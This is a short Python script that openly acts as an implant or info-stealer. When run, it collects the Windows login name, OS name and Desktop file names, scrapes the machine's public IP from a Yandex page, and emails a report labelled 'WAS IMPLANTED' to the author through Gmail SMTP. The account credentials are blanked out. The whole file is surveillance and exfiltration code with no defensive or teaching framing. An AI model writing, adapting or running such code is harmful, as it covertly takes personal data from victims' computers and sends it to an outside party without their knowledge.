import os
import string
import shutil
import socket
import smtplib
from bs4 import BeautifulSoup
from urllib.request import urlopen     


OS_NAME = os.name
LOGIN = os.getlogin()
FILES = []


def get_desktop():
    if os.getcwd() != "C://Users//" + str(LOGIN) + '//Desktop':
        os.chdir("C://Users//" + str(LOGIN) + '//Desktop')
        FILES = os.listdir()
    else:
        pass
        
    FILES_str = ''.join(FILES)
    FILES_str2 = ''.join(c for c in FILES_str if c in string.ascii_letters)
    #print(FILES_str2)
    
    #exes = ['png', 'exe', 'xdoc', 'doc']
    #for ex in exes:
    #    if ex in FILES_str2:
    get_outside_ip(FILES_str2)      
    
        
def get_outside_ip(arg):
    url = urlopen('https://yandex.ru/internet/')
    soup = BeautifulSoup(url, 'html.parser')
    out_str = soup.find('div', class_='client__desc')
    out_str = str(out_str)
    ip = []
    
    for symbol in out_str:
        if '1234567890.'.find(symbol) != -1:
            ip.append(symbol)
            
    outside_ip = ''.join(ip)
    
    report(outside_ip, arg)
    
    
def report(ip_adress, arg):
    array = ['OS_NAME => ' + OS_NAME,
             'LOGIN => ' + LOGIN,
             'FILES => ' + arg]
    pc_name = socket.gethostname()
    report_text = str(ip_adress) + ' WAS IMPLANTED !!! \n\n' + '\n'.join(array)
    msgObject = smtplib.SMTP('smtp.gmail.com', 587)

    msgObject.starttls()
    msgObject.login('----', '-----')
    msgObject.sendmail('123@gmail.com', '-----', str(report_text))
    msgObject.quit()
    

get_desktop()
#get_outside_ip()
